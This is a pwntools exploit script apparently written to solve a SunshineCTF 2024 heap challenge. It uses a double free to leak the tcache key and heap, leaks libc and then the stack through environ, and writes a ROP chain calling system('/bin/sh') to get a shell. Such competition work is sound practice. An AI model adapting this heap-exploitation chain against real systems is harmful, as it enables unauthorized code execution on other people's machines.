#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "2024.sunshinectf.games"
PORT = 24005

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, index, value):
    ru(p,b"Enter your choice >>>")
    sl(p,b"2")
    ru(p,b"Select a pocket to place an item in (1-6) >>> ")    
    sl(p,b"%i" % index)
    ru(p,b"name >>>")
    sl(p,value)

def use(p, index):
    ru(p,b"Enter your choice >>>")
    sl(p,b"1")
    ru(p,b"Use item from which pocket (1-6) >>>")
    sl(p,"%i" % index)
    ru(p,b"Using item from pocket %d: " % index) 

    return rl(p).strip(b'\n')

def delete(p, index):
    ru(p,b"Enter your choice >>>")
    sl(p,b"3")
    ru(p,b"Select a pocket to remove an item from (1-6) >>>")
    sl(p,"%i" % index)

def generate_rop_chain(l):
    r = ROP(l)

    chain = p64(r.find_gadget(["ret"])[0]) * 2
    chain += p64(r.find_gadget(["pop rdi", "ret"])[0])
    chain += p64(next(l.search(b"/bin/sh\x00")))
    chain += p64(l.sym["system"])

    return chain


def exploit(p,e,l):
    
    delete(p,1)
    delete(p,1)

    tcache_mangle = up(use(p,1))
    heap_leak = tcache_mangle << 12
    log.info(f"Leaked tcache mangle key {hex(tcache_mangle)}")
    log.info(f"Leaked heap {hex(heap_leak)}")
    
    create(p,5,b"Genie")
    use(p,5)

    ru(p,b" secret starting point:")
    l.address = int(rl(p),16) - l.sym["printf"]

    log.info(f"Leaked libc base address {hex(l.address)}")
    
    target = (l.sym["environ"] - 0x18) ^ tcache_mangle

    delete(p,2)
    delete(p,3)
    delete(p,4)  
    delete(p,4)

    create(p,4,p64(target))
    create(p,3,b"A")
    create(p,2,b"A"*0x17)

    use(p,2)

    stack_leak = u64(p.recv(6).ljust(8, b"\x00"))
    log.info(f"Leaked stack from libc environ {hex(stack_leak)}")

    delete(p,3)
    delete(p,6)
    delete(p,5)
    delete(p,5)

    target = ((stack_leak - 0x148) & 0xfffffffffffffff0) ^ tcache_mangle

    log.info(f"Sending rop chain at {hex(target ^ tcache_mangle)}")

    create(p,5,p64(target))

    pause()
    create(p,6,b"A")
    create(p,3,generate_rop_chain(l))
 
    for i in range(5):
        use(p,1)

    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")

    exploit(p,e,l)
